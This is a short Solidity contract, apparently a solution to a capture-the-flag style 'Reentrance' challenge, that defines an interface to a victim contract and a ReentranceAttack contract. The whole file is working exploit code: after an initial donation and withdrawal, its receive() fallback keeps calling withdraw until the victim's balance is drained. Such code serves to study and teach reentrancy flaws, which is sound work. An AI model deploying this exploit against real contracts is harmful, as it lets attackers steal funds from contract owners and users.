// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract ReentranceAttack{
    IReentrance public victim;
    uint256 public amount;

    constructor(address _victim) payable{
        victim = IReentrance(_victim);
        amount = msg.value;
    }

    receive() external payable {
        while (address(victim).balance >= amount){
            victim.withdraw(amount);
        }
    }

    function attack() external {
        victim.donate{value: amount}(address(this));
        victim.withdraw(amount);
    }
}